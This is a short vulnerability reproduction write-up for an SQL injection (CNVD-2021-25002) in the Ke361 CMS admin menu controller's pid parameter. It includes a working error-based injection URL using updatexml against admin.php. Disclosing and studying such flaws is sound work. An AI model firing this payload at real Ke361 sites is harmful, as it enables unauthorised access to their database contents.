# Ke361 MenuController.class.php Background SQL injection vulnerability CNVD-2021-25002

## Vulnerability Description

Ke361 The pid parameter in the index() function of MenuController.class.php file exists. SQL injection leaks, causing attackers to obtain database sensitive information through vulnerabilities.

## Vulnerability Impact

<span style="background-color:rgb(18, 160, 255); padding: 2px 4px; border-radius: 3px; color: white;">Ke361</span>

## Environment construction

<span style="background-color:rgb(18, 160, 255); padding: 2px 4px; border-radius: 3px; color: white;">https://gitee.com/jcove/ke361</span>

## Vulnerability reappears

CMS Product Page

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1634130579841-e981591e-46f6-4aa8-bc68-6fe39d1e4e35-20220313232948253.png)

The vulnerable file is `Application/Admin/Controller/MenuController.class.php`

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1634136475760-256dded1-8bef-40a2-b391-e3a84bd7fcc2.png)

Get parameter pid pass SQL statement

```php
SELECT `id`,`title`,`pid`,`sort`,`url`,`hide`,`tip`,`group`,`is_dev`,`status` FROM `ke_menu` WHERE (id=1)
```

Construct SQL injection using parentheses closed statements

```php
/admin.php?s=/Menu/index/pid/1)%20AND%20updatexml(1,concat(0x7e,(select%20md5(1)),0x7e),1)--+
```

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1634140622931-bdc55324-f405-4708-8973-4fef07eeac8e.png)